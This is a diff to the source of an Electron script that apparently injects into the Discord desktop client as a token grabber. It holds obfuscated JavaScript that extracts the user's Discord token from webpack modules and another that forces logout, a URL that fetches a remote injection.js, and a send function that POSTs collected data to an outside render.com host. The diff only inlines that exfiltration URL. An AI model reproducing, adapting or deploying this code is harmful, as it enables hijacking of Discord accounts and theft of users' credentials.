@@ -4,15 +4,13 @@ const { BrowserWindow, session } = require('electron'),
     path = require("path"),
     fs = require("fs");
 
-// Warning if you change the server this will not work !!
-
-const [API, ID, WEBHOOK] = ["https://hook-aurathemes.onrender.com/request", "%ID_REQUEST%", "%WEBHOOK%"];
+const [ID, WEBHOOK] = ["%ID_REQUEST%", "%WEBHOOK%"];
 
 const [LOGOUT_SCRIPT, TOKEN_SCRIPT, INJECT_URL] = ["window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[[\"get_require\"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b=\"string\"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})(\"login\").logout()}LogOut();", "for (let a in window.webpackJsonp ? (gg = window.webpackJsonp.push([[], { get_require: (a, b, c) => a.exports = c }, [['get_require']]]), delete gg.m.get_require, delete gg.c.get_require) : window.webpackChunkdiscord_app && window.webpackChunkdiscord_app.push([[Math.random()], {}, a => { gg = a }]), gg.c) if (gg.c.hasOwnProperty(a)) { let b = gg.c[a].exports; if (b && b.__esModule && b.default) for (let a in b.default) 'getToken' == a && (token = b.default.getToken())} token;", "https://raw.githubusercontent.com/k4itrun/discord-injection/main/injection.js"];
 
 function send(e, d) {
     return new Promise((resolve, reject) => {
-        const url = `${API}/${ID}/${e}`;
+        const url = `https://hook-aurathemes.onrender.com/request/${ID}/${e}`;
         BrowserWindow.getAllWindows()[0].webContents.executeJavaScript(`fetch("${url}", ${JSON.stringify({
             method: 'POST',
             headers: {
